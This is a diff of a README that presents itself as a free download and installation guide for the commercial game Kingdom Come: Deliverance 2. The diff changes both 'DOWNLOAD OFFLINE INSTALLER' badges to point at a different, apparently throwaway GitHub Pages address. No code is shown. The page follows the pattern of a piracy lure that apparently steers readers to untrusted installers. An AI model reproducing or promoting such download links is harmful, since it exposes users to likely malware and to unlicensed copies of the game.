@@ -1,6 +1,6 @@
 # 🏰 Kingdom Come: Deliverance 2 — Free Download Installation Guide
 
-[![🛡 DOWNLOAD OFFLINE INSTALLER — KINGDOM COME: DELIVERANCE II](https://img.shields.io/badge/🛡%20DOWNLOAD-INSTALLER%20%E2%80%94%20KINGDOM%20COME%202-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://kingdom-come-deliverance-2-download-pc.github.io/.github)
+[![🛡 DOWNLOAD OFFLINE INSTALLER — KINGDOM COME: DELIVERANCE II](https://img.shields.io/badge/🛡%20DOWNLOAD-INSTALLER%20%E2%80%94%20KINGDOM%20COME%202-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://omaripetersqehp.github.io/.github/kingdom-come-deliverance-2)
 
 ---
 
@@ -30,7 +30,7 @@ This sequel builds on the legacy of the original game with improved combat mecha
 ![Henry exploring the countryside](https://248006.selcdn.ru/main/iblock/c25/c25ddf07e50f0fd2b1c1637911d9c156/3e202cf51909ef3f67b212c388a7b885.jpg)  
 *Traverse dense forests, rural villages, and real-world castles*
 
-[![🛡 DOWNLOAD OFFLINE INSTALLER — KINGDOM COME: DELIVERANCE II](https://img.shields.io/badge/🛡%20DOWNLOAD-INSTALLER%20%E2%80%94%20KINGDOM%20COME%202-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://kingdom-come-deliverance-2-download-pc.github.io/.github)
+[![🛡 DOWNLOAD OFFLINE INSTALLER — KINGDOM COME: DELIVERANCE II](https://img.shields.io/badge/🛡%20DOWNLOAD-INSTALLER%20%E2%80%94%20KINGDOM%20COME%202-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://omaripetersqehp.github.io/.github/kingdom-come-deliverance-2)
 
 ---
 
